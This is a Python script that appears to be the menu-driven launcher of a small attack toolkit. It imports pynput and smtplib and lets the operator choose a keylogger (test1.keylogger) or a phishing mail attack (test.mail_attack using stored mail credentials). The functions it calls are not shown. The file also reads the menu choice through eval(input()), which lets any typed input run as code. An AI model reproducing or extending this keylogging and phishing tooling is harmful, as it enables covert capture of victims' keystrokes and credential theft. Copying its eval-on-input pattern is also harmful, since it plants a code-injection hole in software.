from pynput.keyboard import Key, Listener
import getpass

import test1
from config import Config as config
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import email, smtplib, ssl
from email import encoders
from email.mime.base import MIMEBase
import test
import test1




# Display commandline menu
def menu():
    MENU = '\
    Choose an operation \n\
        1: Keylog \n\
        2: Phishing\n\
        3: Exit\n \
        '
    print(MENU)




if __name__ == '__main__':

    while True:
        menu()
        choice = eval(input("Choose operation: "))
        if choice == 1:
            print('Listening for keystrokes... \nPress ESC to go back to menu')
            test1.keylogger()
        elif choice == 2:
            test.mail_attack(config.MAIL_USERNAME,config.MAIL_PASSWORD)
        elif choice == 3:
            exit()
        else:
            print('Choice unknown')
            exit()
